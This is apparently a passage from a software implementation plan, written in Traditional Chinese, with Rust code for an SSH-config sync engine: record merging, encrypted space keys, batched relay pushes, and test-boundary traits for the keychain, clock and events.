pub fn unpushed_host_effects(section: &SpaceState, blocks: &[HostBlockText]) -> Vec<HostEffect> {
    section
        .records
        .values()
        .filter(|l| l.dirty && l.record.kind == RecordKind::Host && !l.record.deleted)
        .filter(|l| !blocks.iter().any(|b| b.alias == l.record.id))
        .filter_map(|l| {
            let text = serde_json::from_value::<HostPayload>(l.record.payload.clone()).ok()?.text;
            validate_host_text(&l.record.id, &text).ok()?;
            Some(HostEffect::Upsert { alias: l.record.id.clone(), text })
        })
        .collect()
}

// ── 帳戶區段 ─────────────────────────────────────────────────────────────────────────────────

/// 帳戶裡的一個 space(`space` 記錄;tombstone 也列出,`deleted` = true)。
#[derive(Clone, Debug, PartialEq)]
pub struct SpaceEntry {
    pub id: String,
    pub name: String,
    pub slug: String,
    pub created_at_ms: u64,
    pub previous_id: Option<String>,
    pub deleted: bool,
    /// 最後寫入這筆 `space` 記錄的裝置。
    pub updated_by: String,
}

/// 帳戶裡的 space(含 tombstone),依 Include 清單的順序(名稱不分大小寫 → 名稱 → id)。payload 讀不懂的略過;
/// tombstone 若沒有 payload,名稱是空字串。
pub fn space_entries(account: &AccountState) -> Vec<SpaceEntry> {
    let mut out: Vec<SpaceEntry> = account
        .records
        .values()
        .filter(|l| l.record.kind == RecordKind::Space && is_chain_id(&l.record.id))
        .filter_map(|l| {
            let payload = serde_json::from_value::<SpacePayload>(l.record.payload.clone()).ok();
            if payload.is_none() && !l.record.deleted {
                return None;
            }
            let payload = payload.unwrap_or(SpacePayload {
                schema: SCHEMA_VERSION,
                name: String::new(),
                slug: String::new(),
                created_at_ms: 0,
                previous_id: None,
            });
            Some(SpaceEntry {
                id: l.record.id.clone(),
                name: payload.name,
                slug: payload.slug,
                created_at_ms: payload.created_at_ms,
                previous_id: payload.previous_id,
                deleted: l.record.deleted,
                updated_by: l.record.device_id.clone(),
            })
        })
        .collect();
    out.sort_by(|a, b| {
        a.name
            .to_lowercase()
            .cmp(&b.name.to_lowercase())
            .then_with(|| a.name.cmp(&b.name))
            .then_with(|| a.id.cmp(&b.id))
    });
    out
}

pub fn space_entry(account: &AccountState, space_id: &str) -> Option<SpaceEntry> {
    space_entries(account).into_iter().find(|e| e.id == space_id)
}

/// `spacekey` 在 `sealed` 裡的 key(以帳戶金鑰算的 id_hash)。
pub fn space_key_slot(account_keys: &ChainKeys, space_id: &str) -> String {
    sealed_key(RecordKind::SpaceKey.as_str(), &id_hash(account_keys, RecordKind::SpaceKey.as_str(), space_id))
}

/// 在記憶體解開一個 space 的權杖與金鑰。沒有、已刪除或讀不懂 → None(這個 space 不能同步)。
pub fn space_keys(account: &AccountState, account_keys: &ChainKeys, space_id: &str) -> Option<ChainKeys> {
    let sealed = account.sealed.get(&space_key_slot(account_keys, space_id))?;
    let record = sealed.open(account_keys).ok()?;
    if record.deleted || record.id != space_id {
        return None;
    }
    serde_json::from_value::<SpaceKeyPayload>(record.payload).ok()?.to_keys(space_id).ok()
}

/// 這個 space 是否已從帳戶刪除;是的話回傳刪除它的裝置 id。`space` 記錄是 tombstone,或 `spacekey` 記錄是 tombstone
/// 都算:刪除與別台的改名同時發生時,改名可能贏了 `space` 記錄的 LWW,`spacekey` 的 tombstone 卻仍在 —— 沒有金鑰的
/// space 無法再同步,所以每台都一致地把它當成已刪除(刪除優先)。`spacekey` 還沒到的 space 不算刪除。
pub fn space_deleted_by(account: &AccountState, account_keys: &ChainKeys, space_id: &str) -> Option<String> {
    if let Some(l) = account.records.get(&record_key(RecordKind::Space, space_id)).filter(|l| l.record.deleted) {
        return Some(l.record.device_id.clone());
    }
    let record = account.sealed.get(&space_key_slot(account_keys, space_id))?.open(account_keys).ok()?;
    record.deleted.then_some(record.device_id)
}

/// 帳戶裡未刪除的裝置記錄(id, payload)。
pub fn devices(account: &AccountState) -> Vec<(String, DevicePayload)> {
    account
        .records
        .values()
        .filter(|l| l.record.kind == RecordKind::Device && !l.record.deleted)
        .filter_map(|l| Some((l.record.id.clone(), serde_json::from_value(l.record.payload.clone()).ok()?)))
        .collect()
}

/// 裝置顯示名稱;帳戶裡查不到時就是 device id。
pub fn device_name(account: &AccountState, device_id: &str) -> String {
    devices(account)
        .into_iter()
        .find(|(id, _)| id == device_id)
        .map(|(_, p)| p.name)
        .unwrap_or_else(|| device_id.to_string())
}

/// 帳戶區段裡寫一筆這台產生的明文記錄(`space` / `device` / `meta`):版本號與時間戳接在前一版之後、保留 seq、
/// 標 dirty。
pub fn put_account_record(
    account: &mut AccountState,
    kind: RecordKind,
    id: &str,
    payload: Value,
    deleted: bool,
    device_id: &str,
    now_ms: u64,
) {
    let key = record_key(kind, id);
    let previous = account.records.get(&key);
    let record = Record {
        kind,
        id: id.to_string(),
        version: previous.map(|l| l.record.version + 1).unwrap_or(1),
        updated_at_ms: next_timestamp(now_ms, previous.map(|l| l.record.updated_at_ms)),
        device_id: device_id.to_string(),
        deleted,
        payload,
    };
    let seq = previous.map(|l| l.seq).unwrap_or(0);
    account.records.insert(key, LocalRecord { record, seq, dirty: true });
}

/// 寫一筆 `spacekey` 記錄(祕密,spec §4.1):以帳戶金鑰加密後放進 `sealed`(dirty),明文只在記憶體。
/// `space_keys` = None 寫 tombstone(不帶任何祕密)。版本號、時間戳與 seq 接在前一版之後。
pub fn put_space_key(
    account: &mut AccountState,
    account_keys: &ChainKeys,
    space_id: &str,
    space_keys: Option<&ChainKeys>,
    device_id: &str,
    now_ms: u64,
) -> Result<(), AppError> {
    let slot = space_key_slot(account_keys, space_id);
    let previous = account.sealed.get(&slot).and_then(|s| s.open(account_keys).ok().map(|r| (r, s.envelope.seq)));
    let record = Record {
        kind: RecordKind::SpaceKey,
        id: space_id.to_string(),
        version: previous.as_ref().map(|(r, _)| r.version + 1).unwrap_or(1),
        updated_at_ms: next_timestamp(now_ms, previous.as_ref().map(|(r, _)| r.updated_at_ms)),
        device_id: device_id.to_string(),
        deleted: space_keys.is_none(),
        payload: match space_keys {
            Some(k) => serde_json::to_value(SpaceKeyPayload::from_keys(k)).expect("SpaceKeyPayload serializes"),
            None => Value::Null,
        },
    };
    let sealed = SealedRecord::seal(account_keys, &record, previous.map(|(_, seq)| seq).unwrap_or(0))?;
    account.sealed.insert(slot, sealed);
    Ok(())
}

/// 這台的 `device` 記錄(spec §4.1):v1 的欄位加上這台勾選的 space id(呼叫端排好序)。`joined_at_ms` 沿用前一版。
pub fn own_device_record(
    account: &AccountState,
    device_id: &str,
    device_name: &str,
    platform: &str,
    spaces: &[String],
    now_ms: u64,
) -> Record {
    let key = record_key(RecordKind::Device, device_id);
    let previous = account.records.get(&key).map(|l| &l.record);
    let joined_at_ms = previous
        .and_then(|r| serde_json::from_value::<DevicePayload>(r.payload.clone()).ok())
        .map(|p| p.joined_at_ms)
        .unwrap_or(now_ms);
    Record {
        kind: RecordKind::Device,
        id: device_id.to_string(),
        version: previous.map(|r| r.version + 1).unwrap_or(1),
        updated_at_ms: next_timestamp(now_ms, previous.map(|r| r.updated_at_ms)),
        device_id: device_id.to_string(),
        deleted: false,
        payload: serde_json::to_value(DevicePayload {
            schema: SCHEMA_VERSION,
            name: device_name.to_string(),
            platform: platform.to_string(),
            joined_at_ms,
            last_seen_ms: now_ms,
            keys: Vec::new(),
            spaces: spaces.to_vec(),
        })
        .expect("DevicePayload serializes"),
    }
}

/// 心跳與勾選變更:快取裡這台的裝置記錄超過一小時沒更新,或名稱、平台、勾選的 space 和現況不同,就寫一版新的
/// (dirty)。回傳是否寫了。
pub fn plan_device(
    account: &mut AccountState,
    device_id: &str,
    device_name: &str,
    platform: &str,
    spaces: &[String],
    now_ms: u64,
) -> bool {
    let key = record_key(RecordKind::Device, device_id);
    let current = account
        .records
        .get(&key)
        .filter(|l| !l.record.deleted)
        .and_then(|l| serde_json::from_value::<DevicePayload>(l.record.payload.clone()).ok());
    let up_to_date = current.is_some_and(|p| {
        now_ms.saturating_sub(p.last_seen_ms) < HEARTBEAT_MS && p.name == device_name && p.platform == platform && p.spaces == spaces
    });
    if up_to_date {
        return false;
    }
    let record = own_device_record(account, device_id, device_name, platform, spaces, now_ms);
    let seq = account.records.get(&key).map(|l| l.seq).unwrap_or(0);
    account.records.insert(key, LocalRecord { record, seq, dirty: true });
    true
}

/// `merge_account` 的結果。`markers` 非空 = 帳戶已被更換同步碼(spec §7.5):呼叫端**不採用** `section`,只記下
/// `frozen`、停止這一輪。
#[derive(Clone, Debug)]
pub struct AccountMerged {
    pub section: AccountState,
    pub markers: Vec<RotationMarkerPayload>,
    pub skipped: u32,
}

/// 帳戶 chain 上的明文記錄是否可以進快取:space / spacekey 的 id 必須是 64 字元小寫 hex(之後會組進檔名與 URL),
/// payload 必須讀得懂(tombstone 除外)。
fn valid_account_record(record: &Record) -> bool {
    let parses = |ok: bool| record.deleted || ok;
    match record.kind {
        RecordKind::Space => {
            is_chain_id(&record.id) && parses(serde_json::from_value::<SpacePayload>(record.payload.clone()).is_ok())
        }
        RecordKind::SpaceKey => {
            is_chain_id(&record.id)
                && parses(
                    serde_json::from_value::<SpaceKeyPayload>(record.payload.clone())
                        .ok()
                        .is_some_and(|p| p.to_keys(&record.id).is_ok()),
                )
        }
        RecordKind::Device => parses(serde_json::from_value::<DevicePayload>(record.payload.clone()).is_ok()),
        RecordKind::Meta if record.id == ACCOUNT_META_ID => {
            parses(serde_json::from_value::<MetaPayload>(record.payload.clone()).is_ok())
        }
        RecordKind::Meta if rotation_marker_device(&record.id).is_some() => {
            parses(serde_json::from_value::<RotationMarkerPayload>(record.payload.clone()).is_ok())
        }
        RecordKind::Meta => true,
        _ => false,
    }
}

/// 帳戶 chain 拉到的記錄 → 合併(spec §7.1 第 4–5 步)。`device` / `space` / `meta` 解密進 `records`;`spacekey` 只在
/// 記憶體解開比較,保存的是密文(`sealed`);其他種類(含未知)原樣存進 `sealed`、永不解密。拉到的 `meta`
/// `rotation:*`(未刪除)收進 `markers`。
pub fn merge_account(section: &AccountState, keys: &ChainKeys, pulled: &PullResponse) -> AccountMerged {
    let mut next = section.clone();
    let mut markers = Vec::new();
    let mut skipped = 0;
    for env in &pulled.records {
        let kind = RecordKind::parse(&env.kind);
        match kind {
            Some(RecordKind::Device | RecordKind::Meta | RecordKind::Space | RecordKind::SpaceKey) => {}
            _ => {
                // 本版不處理的種類:密文原樣保存,不解密、不刪除(spec §4.1)。
                next.sealed.insert(sealed_key(&env.kind, &env.id_hash), SealedRecord { envelope: env.clone(), dirty: false });
                continue;
            }
        }
        let record = match decode(keys, env) {
            Ok(r) if valid_account_record(&r) => r,
            _ => {
                skipped += 1;
                continue;
            }
        };
        if record.kind == RecordKind::Meta && rotation_marker_device(&record.id).is_some() && !record.deleted {
            if let Ok(marker) = serde_json::from_value::<RotationMarkerPayload>(record.payload.clone()) {
                markers.push(marker);
            }
        }
        if record.kind == RecordKind::SpaceKey {
            let slot = sealed_key(&env.kind, &env.id_hash);
            let local = next.sealed.get(&slot).and_then(|s| {
                s.open(keys).ok().map(|r| LocalRecord { record: r, seq: s.envelope.seq, dirty: s.dirty })
            });
            match merge(local.as_ref(), &record) {
                MergeOutcome::KeepLocal => {
                    if let Some(s) = next.sealed.get_mut(&slot) {
                        s.envelope.seq = env.seq;
                    }
                }
                _ => {
                    next.sealed.insert(slot, SealedRecord { envelope: env.clone(), dirty: false });
                }
            }
            continue;
        }
        let key = record_key(record.kind, &record.id);
        match merge(next.records.get(&key), &record) {
            MergeOutcome::KeepLocal => {
                if let Some(local) = next.records.get_mut(&key) {
                    local.seq = env.seq;
                }
            }
            _ => {
                if record.kind == RecordKind::Meta && record.id == ACCOUNT_META_ID {
                    if let Ok(meta) = serde_json::from_value::<MetaPayload>(record.payload.clone()) {
                        next.remote_schema_version = Some(meta.schema_version);
                    }
                }
                next.records.insert(key, LocalRecord { record, seq: env.seq, dirty: false });
            }
        }
    }
    if pulled.latest_seq < section.cursor_seq {
        // 同 `merge_space`:relay 倒退,整份以 seq 0 重新上傳(未知種類的密文不是這台寫的,不重推)。
        next.cursor_seq = 0;
        for local in next.records.values_mut() {
            local.seq = 0;
            local.dirty = true;
        }
        for sealed in next.sealed.values_mut().filter(|s| s.envelope.kind == RecordKind::SpaceKey.as_str()) {
            sealed.envelope.seq = 0;
            sealed.dirty = true;
        }
    } else {
        next.cursor_seq = pulled.latest_seq;
    }
    AccountMerged { section: next, markers, skipped }
}

// ── 上傳 ────────────────────────────────────────────────────────────────────────────────────

/// 一筆要上傳的記錄;`key` 是它在區段裡的 key(`records` 或 `sealed`)。上傳結果靠 `version` / `updated_at_ms`
/// (明文記錄)或密文本身(`sealed`)對回區段 —— 推送期間記錄若已被換掉,就不動它。
#[derive(Clone, Debug)]
pub struct Outgoing {
    pub key: String,
    pub item: PushItem,
    pub version: u64,
    pub updated_at_ms: u64,
}

pub fn space_outgoing(section: &SpaceState, keys: &ChainKeys) -> Result<Vec<Outgoing>, AppError> {
    section
        .records
        .iter()
        .filter(|(_, l)| l.dirty)
        .map(|(key, l)| {
            Ok(Outgoing {
                key: key.clone(),
                item: encode(keys, &l.record, l.seq)?,
                version: l.record.version,
                updated_at_ms: l.record.updated_at_ms,
            })
        })
        .collect()
}

/// 帳戶區段的 dirty 記錄:明文記錄加密後上傳,`sealed` 的 dirty 密文原樣上傳。
pub fn account_outgoing(section: &AccountState, keys: &ChainKeys) -> Result<Vec<Outgoing>, AppError> {
    let mut out: Vec<Outgoing> = section
        .records
        .iter()
        .filter(|(_, l)| l.dirty)
        .map(|(key, l)| {
            Ok(Outgoing {
                key: key.clone(),
                item: encode(keys, &l.record, l.seq)?,
                version: l.record.version,
                updated_at_ms: l.record.updated_at_ms,
            })
        })
        .collect::<Result<_, AppError>>()?;
    out.extend(
        section
            .sealed
            .iter()
            .filter(|(_, s)| s.dirty)
            .map(|(key, s)| Outgoing { key: key.clone(), item: s.push_item(), version: 0, updated_at_ms: 0 }),
    );
    Ok(out)
}

/// 推送的結果:被接受的(key, relay 序號)、衝突筆數、是否撞到凍結的 chain。
#[derive(Clone, Debug, Default, PartialEq)]
pub struct Pushed {
    pub accepted: Vec<(String, u64)>,
    pub conflicts: usize,
    /// `409 frozen`(spec §6.4):這一批之後的都沒送,呼叫端停止這一輪的所有上傳、保留 dirty。
    pub frozen: bool,
}

/// 分批上傳(每批 ≤ 200 筆且 ≤ 512 KiB)。衝突的保持 dirty,下一輪 pull 拿到 relay 的版本再合併。chain 被凍結就
/// 立刻停下(`frozen`)。`accepted` 只更新該筆的 seq —— 絕不推進 cursor。
pub fn push_outgoing(relay: &dyn RelayApi, chain_id: &str, token: &str, outgoing: &[Outgoing]) -> Result<Pushed, RelayError> {
    let mut pushed = Pushed::default();
    let mut start = 0;
    while start < outgoing.len() {
        let mut end = start;
        let mut bytes = 0usize;
        while end < outgoing.len() {
            let size = outgoing[end].item.ciphertext.len() + outgoing[end].item.nonce.len();
            if end > start && (end - start >= PUSH_BATCH_ITEMS || bytes + size > PUSH_BATCH_BYTES) {
                break;
            }
            bytes += size;
            end += 1;
        }
        let batch = &outgoing[start..end];
        let items: Vec<PushItem> = batch.iter().map(|o| o.item.clone()).collect();
        match relay.push(chain_id, token, &items)? {
            PushOutcome::Frozen => {
                pushed.frozen = true;
                return Ok(pushed);
            }
            PushOutcome::Applied(results) => {
                for (o, result) in batch.iter().zip(results) {
                    match result {
                        PushResult::Accepted { seq } => pushed.accepted.push((o.key.clone(), seq)),
                        PushResult::Conflict { .. } => pushed.conflicts += 1,
                    }
                }
            }
        }
        start = end;
    }
    Ok(pushed)
}

pub fn apply_pushed_space(section: &mut SpaceState, outgoing: &[Outgoing], pushed: &Pushed) {
    for (key, seq) in &pushed.accepted {
        let Some(o) = outgoing.iter().find(|o| &o.key == key) else { continue };
        if let Some(local) = section.records.get_mut(key) {
            if local.record.version == o.version && local.record.updated_at_ms == o.updated_at_ms {
                local.seq = *seq;
                local.dirty = false;
                section.republish.remove(key);
            }
        }
    }
}

pub fn apply_pushed_account(section: &mut AccountState, outgoing: &[Outgoing], pushed: &Pushed) {
    for (key, seq) in &pushed.accepted {
        let Some(o) = outgoing.iter().find(|o| &o.key == key) else { continue };
        if let Some(local) = section.records.get_mut(key) {
            if local.record.version == o.version && local.record.updated_at_ms == o.updated_at_ms {
                local.seq = *seq;
                local.dirty = false;
            }
        } else if let Some(sealed) = section.sealed.get_mut(key) {
            if sealed.envelope.ciphertext == o.item.ciphertext {
                sealed.envelope.seq = *seq;
                sealed.dirty = false;
            }
        }
    }
}

/// 這台勾選的 space 的 Include 清單(spec §4.3 的順序)。檔名來自狀態;名稱來自帳戶的 `space` 記錄(查不到就用 id)。
pub fn selected_include_tokens(account: Option<&AccountState>, spaces: &std::collections::BTreeMap<String, SpaceState>) -> Result<Vec<String>, AppError> {
    let refs: Vec<crate::sync::space_files::SpaceFileRef> = spaces
        .iter()
        .filter(|(_, s)| s.selected)
        .map(|(id, s)| crate::sync::space_files::SpaceFileRef {
            space_id: id.clone(),
            name: account.and_then(|a| space_entry(a, id)).map(|e| e.name).unwrap_or_else(|| id.clone()),
            file_name: s.file_name.clone(),
        })
        .collect();
    include_tokens(&refs)
}
```

- [ ] **Step 8: 跑測試確認通過**

Run: `cd src-tauri && cargo test -- --skip secrets::tests::round_trip_set_get_delete --skip askpass::tests::env_secret_takes_priority_over_keychain`
Expected: PASS —— `test result: ok. 523 passed; 0 failed`(task 開始前 503)。數量有變的模組:`sync::fake_relay` 1(新)、`sync::merge` 17(新)、`sync::state_v2` 11 → 13。非測試建置會有一長串 `dead_code` 類的 warning(`is never used` 之類):B2 留下的,加上本計畫新增、要到 B3b Task 2 才接上的項目;B3b Task 2 之後只剩既有的 `set_host_enabled`。這是預期的,不要加 `#[allow(dead_code)]`;不得有其他種類的 warning。

- [ ] **Step 9: Commit**

只加下列路徑(`src-tauri/Cargo.lock` 的版本漂移不要 stage):

```bash
git add src-tauri/src/sync/fake_relay.rs
git add src-tauri/src/sync/state_v2.rs
git add src-tauri/src/sync/merge.rs
git add src-tauri/src/sync/mod.rs
git add src/bindings/SyncNotice.ts
git commit -m "feat(sync): add the v2 record layer and an in-memory relay for engine tests"
```

---

### Task 2: 執行期狀態、`SyncEnv` 邊界、space 檔交易、測試裝置

> **已執行**(repo `22d49cc`;審查後的修正 `7d892e6`)。下面保留原本的步驟作為紀錄,不要再執行;實際的程式碼以 repo 為準,審查後與本節不同的介面見 Global Constraints 的「Task 2–3 實際的介面」。執行後(兩個 keychain 測試都略過)是 `552 passed`(`sync::files` 23、`sync::runtime` 3、`config::include` 6);下面 Step 裡的數字是原本計畫的。

引擎與外界的邊界(`env`)、執行期狀態與局部提交(`runtime`)、space 檔在 doc 與磁碟上的處理(`files`),以及之後每個
引擎測試用的 `testkit`。`files` 是 v1 `apply_and_commit` 的推廣:每個 space 的「套用 + 發布」是獨立交易 —— 在 doc 鎖內
比對該 space 檔的指紋、寫檔(`persist_file`,不持有 core 鎖)、再在 core 鎖內比 generation 並只換掉該 space 的區段;
失敗就整份丟棄,下一輪重拉。`prepare_files` 每輪開頭把 space 檔與 Include 清單整理到位(半途的取消勾選做完、不見的檔
重新長出、Include 依 spec §4.3 的順序規則)。v1 引擎的幾個 helper 搬到 `files`(兩版共用),v1 行為與測試不變。
`config::include` 多一個測試建置才有的 `with_test_home`,讓 Include 裡的 `~` 指到暫存家目錄。

**Files:**
- Create: `src-tauri/src/sync/runtime.rs`
- Create: `src-tauri/src/sync/env.rs`
- Create: `src-tauri/src/sync/files.rs`
- Create: `src-tauri/src/sync/dto.rs`(這個 task 只有事件 payload;B3b 改寫成完整的狀態 DTO)
- Create: `src-tauri/src/sync/testkit.rs`(`#[cfg(test)]`)
- Modify: `src-tauri/src/config/include.rs`(`expand_token`、`with_test_home`)
- Modify: `src-tauri/src/sync/engine.rs`(helper 搬到 `files`,改成 `use`)
- Modify: `src-tauri/src/sync/mod.rs`
- Generated: `src/bindings/SyncConflict.ts`、`src/bindings/ApprovalNotice.ts`

**Interfaces:**
- Consumes(Task 1):`merge::{plan_hosts, selected_include_tokens, put_account_record, put_space_key}`、
  `fake_relay::{FakeRelay, connect}`、`state_v2::SyncNotice`。
- Consumes(B2 與既有程式):`state_v2::{SyncStateV2, AccountState, SpaceState, save, NEXT_MNEMONIC_ACCOUNT}`、
  `state::SyncState`(v1,作 `LegacyState`)、`space_files::{space_file_path, remove_space_file, slugify, space_file_name}`、
  `hosts_file::{ensure_include, blocks_of, apply_host_text, remove_host_block, is_syncable_block, forbidden_directive,
  HostBlockText}`、`relay::{RelayApi, RelayClient}`、`config::commands::{persist_file, load_doc_migrated}`、
  `config::model::{SshConfigDoc, ConfigFile, Item}`、`config::parser::parse_file`、`config::serialize::serialize_items`、
  `fsutil::{atomic_write, file_fingerprint, has_changed, Fingerprint}`、`secrets::{get, set, delete}`。
- Produces(`runtime`):
  - `pub struct SyncCore { pub generation: u64, pub state: Option<SyncStateV2>, pub account_keys: Option<ChainKeys>, pub legacy: Option<LegacyState>, pub unsaved: bool, pub save_blocked: Option<String>, pub conflict_streak: u32, pub failed_rounds: u32, pub batch_failures: u32, pub relay_checked: Option<String>, pub rounds: u64 }`
  - `pub struct SyncRuntime { pub core: Mutex<SyncCore>, pub lifecycle: Mutex<()>, pub syncing: AtomicBool, pub focused: AtomicBool, pub last_activity_ms: AtomicU64 }`;
    `SyncRuntime::note_activity(&self, now_ms: u64)`、`SyncRuntime::set_focused(&self, focused: bool, now_ms: u64)`
  - `pub const SUPERSEDED: &str`、`pub const UPGRADING_MESSAGE: &str`;`pub fn superseded() -> AppError`;`pub fn is_superseded(e: &AppError) -> bool`
  - `pub fn save_core(core: &mut SyncCore, state_path: &Path) -> Result<(), AppError>`
  - `pub fn commit<T>(env: &SyncEnv, generation: u64, f: impl FnOnce(&mut SyncStateV2) -> Result<T, AppError>) -> Result<T, AppError>`(generation 不符 → `superseded()`)
  - `pub fn mutate<T>(env: &SyncEnv, f: impl FnOnce(&mut SyncStateV2) -> Result<T, AppError>) -> Result<T, AppError>`(成功才換 generation 並存檔)
  - `pub fn snapshot(env: &SyncEnv) -> Option<SyncStateV2>`
- Produces(`env`):`pub trait Keychain { get, set, delete }`(+ `OsKeychain`);`pub trait Clock { fn now_ms(&self) -> u64 }`
  (+ `SystemClock`);`pub trait RelayConnector { fn connect(&self, base_url: &str) -> Result<Box<dyn RelayApi>, AppError> }`
  (+ `HttpRelays`);`pub trait SyncEvents { fn status(&self); fn applied(&self, hosts: usize); fn conflict(&self, &[SyncConflict]); fn approval(&self, &[ApprovalNotice]); fn notice(&self, &SyncNotice); fn wake(&self) }`;
  `pub struct SyncEnv<'a> { doc, backed_up, retention, runtime, ssh_dir, state_path, home, keychain, relays, events, clock, platform }`,
  方法 `now()`、`retention()`、`relay(base_url)`、`load_doc(main)`。
- Produces(`files`):`pub fn check_managed_items(items: &[Item]) -> Result<(), AppError>`;
  `pub fn apply_effects_to_items(items: &mut Vec<Item>, effects: &[HostEffect]) -> (bool, Vec<String>)`;
  `pub(crate) struct EngineWrite`(RAII)、`pub(crate) fn engine_writing() -> bool`、`pub(crate) fn items_match_disk(items: &[Item], trailing_newline: bool, disk: &[u8]) -> bool`、
  `pub(crate) fn memory_matches_disk(file: &ConfigFile) -> bool`;`pub fn space_path(env: &SyncEnv, file_name: &str) -> Result<PathBuf, AppError>`;
  `pub fn write_include(doc: &mut SshConfigDoc, backed_up: &mut HashSet<PathBuf>, retention: Option<usize>, tokens: &[String]) -> Result<(), AppError>`;
  `pub fn space_vanished(space: &SpaceState) -> bool`;`pub fn space_emptied(blocks: &[HostBlockText], space: &SpaceState) -> bool`;
  `pub fn reset_space_for_rematerialize(space: &mut SpaceState)`;
  `pub struct Prepared { pub reloaded: bool, pub rematerialized: Vec<String> }`;`pub fn prepare_files(env: &SyncEnv) -> Result<Option<Prepared>, AppError>`(doc 未載入 → `None`);
  `pub struct Gathered { pub blocks: Vec<HostBlockText>, pub fingerprint: Fingerprint, pub modified_ms: u64 }`;
  `pub type GatherResults = BTreeMap<String, Result<Gathered, String>>`;`pub fn gather(env: &SyncEnv, spaces: &[(String, PathBuf)]) -> Result<(GatherResults, bool), AppError>`;
  `pub enum Applied { Committed { wrote: bool, save_error: Option<AppError> }, FileChanged }`;
  `pub fn apply_and_commit_space(env: &SyncEnv, generation: u64, space_id: &str, path: &Path, gathered: &Fingerprint, effects: &[HostEffect], next: &SpaceState) -> Result<Applied, AppError>`
  (發布時保留最新的 `rename_blocked`);
  `pub fn note_written(env: &SyncEnv, path: &Path, items: &[Item])`(存檔 hook:依路徑找出 space,當下規劃 dirty 記錄)。
- Produces(`dto`):`pub struct SyncConflict { space_id, space_name, aliases: Vec<String> }`、`pub struct ApprovalNotice { space_id, space_name, aliases: Vec<String> }`(ts-rs)。
- Produces(`testkit`,只在測試):`RELAY_URL`;`TestClock::new() -> Arc<TestClock>`(每讀一次前進 1 ms);`MemKeychain`
  (`fail_reads`、`fail_deletes`、`entry`);`RecordingEvents`(`statuses()`、`wakes()`、`applied`、`conflicts`、`approvals`、
  `notices`);`FakeConnector`;`TestDevice::{new, with_main_config, env, ssh_dir, main_path, reload, state, read,
  main_config, space_path, write_externally, save_in_app, join_with_spaces}`。
- Produces(`config::include`,只在測試):`pub(crate) fn with_test_home<T>(home: &Path, f: impl FnOnce() -> T) -> T`。

- [ ] **Step 1: 介面 `src-tauri/src/sync/dto.rs`**

事件 payload(`SyncEvents` 的參數);B3b 會把這個檔案改寫成完整的狀態 DTO。

建立 `src-tauri/src/sync/dto.rs`(測試會用到的型別與介面,先寫好):

```rust
//! Sync v2 給前端的資料形狀(ts-rs 匯出到 `src/bindings/`):事件 payload 與狀態。u64 一律以 `number` 匯出。

use serde::{Deserialize, Serialize};

/// `sync://conflict` 的一項(spec §7.1 第 8 步):這台未上傳的修改被別台較新的版本取代。
#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[cfg_attr(test, derive(ts_rs::TS))]
#[cfg_attr(test, ts(export, export_to = "../../src/bindings/"))]
pub struct SyncConflict {
    pub space_id: String,
    pub space_name: String,
    pub aliases: Vec<String>,
}

/// `sync://approval` 的一項(spec §7.4):這一輪新保留、等待核准的主機。
#[derive(Clone, Debug, PartialEq, Serialize, Deserialize)]
#[cfg_attr(test, derive(ts_rs::TS))]
#[cfg_attr(test, ts(export, export_to = "../../src/bindings/"))]
pub struct ApprovalNotice {
    pub space_id: String,
    pub space_name: String,
    pub aliases: Vec<String>,
}
```

- [ ] **Step 2: 介面 `src-tauri/src/sync/env.rs`**

引擎與外界的邊界:`testkit` 的替身與 B3b 的 production 實作都實作這些 trait。`OsKeychain`、`HttpRelays`、`SystemClock` 是 production 版(測試不用)。

建立 `src-tauri/src/sync/env.rs`(測試會用到的型別與介面,先寫好):

```rust
//! 同步引擎與外界的邊界:app 狀態的鎖、`~/.ssh`、狀態檔路徑、keychain、relay、事件與時鐘。production 由
//! `AppHandle` 組出(`engine`),測試以暫存目錄、記憶體 keychain、假 relay 與記錄事件的替身組出(`testkit`)——
//! 引擎本身不碰 Tauri,多台裝置的情境因此能在同一個測試裡決定性地重現。

use std::collections::HashSet;
use std::path::{Path, PathBuf};
use std::sync::Mutex;
use std::time::{SystemTime, UNIX_EPOCH};

use crate::config::model::SshConfigDoc;
use crate::error::AppError;
use crate::sync::dto::{ApprovalNotice, SyncConflict};
use crate::sync::relay::{RelayApi, RelayClient};
use crate::sync::runtime::SyncRuntime;
use crate::sync::state_v2::SyncNotice;

/// OS keychain 的抽象(account 名稱見 `state::MNEMONIC_ACCOUNT`、`state_v2::NEXT_MNEMONIC_ACCOUNT`)。
pub trait Keychain: Send + Sync {
    fn get(&self, account: &str) -> Result<Option<String>, AppError>;
    fn set(&self, account: &str, secret: &str) -> Result<(), AppError>;
    /// 不存在也算成功(清理路徑要能重複執行)。
    fn delete(&self, account: &str) -> Result<(), AppError>;
}

/// 真正的 OS keychain(`secrets`)。
pub struct OsKeychain;

impl Keychain for OsKeychain {
    fn get(&self, account: &str) -> Result<Option<String>, AppError> {
        crate::secrets::get(account)
    }
    fn set(&self, account: &str, secret: &str) -> Result<(), AppError> {
        crate::secrets::set(account, secret)
    }
    fn delete(&self, account: &str) -> Result<(), AppError> {
        crate::secrets::delete(account)
    }
}

pub trait Clock: Send + Sync {
    fn now_ms(&self) -> u64;
}

pub struct SystemClock;

impl Clock for SystemClock {
    fn now_ms(&self) -> u64 {
        SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_millis() as u64).unwrap_or(0)
    }
}

/// 依 relay URL 建立 v2 client。**只能在同步執行緒或 `spawn_blocking` 裡呼叫**(`reqwest::blocking`)。
pub trait RelayConnector: Send + Sync {
    fn connect(&self, base_url: &str) -> Result<Box<dyn RelayApi>, AppError>;
}

pub struct HttpRelays;

impl RelayConnector for HttpRelays {
    fn connect(&self, base_url: &str) -> Result<Box<dyn RelayApi>, AppError> {
        Ok(Box::new(RelayClient::new(base_url)?))
    }
}

/// 引擎對外的通知。**呼叫端不得持有任何鎖**:production 會重建 tray(同步等待主執行緒)、組狀態、發 Tauri 事件。
pub trait SyncEvents: Send + Sync {
    /// `sync://status`:狀態變了(production 自己組 `SyncOverview`)。
    fn status(&self);
    /// `sync://applied`:引擎寫了 space 檔或整份重載了 doc(`hosts` = 套用的主機數,重載為 0);production 也重建 tray。
    fn applied(&self, hosts: usize);
    fn conflict(&self, conflicts: &[SyncConflict]);
    fn approval(&self, waiting: &[ApprovalNotice]);
    /// `sync://notice`:新的提示(也存進 `SyncStateV2::notices`)。
    fn notice(&self, notice: &SyncNotice);
    /// 請背景執行緒立刻再跑一輪。
    fn wake(&self);
}

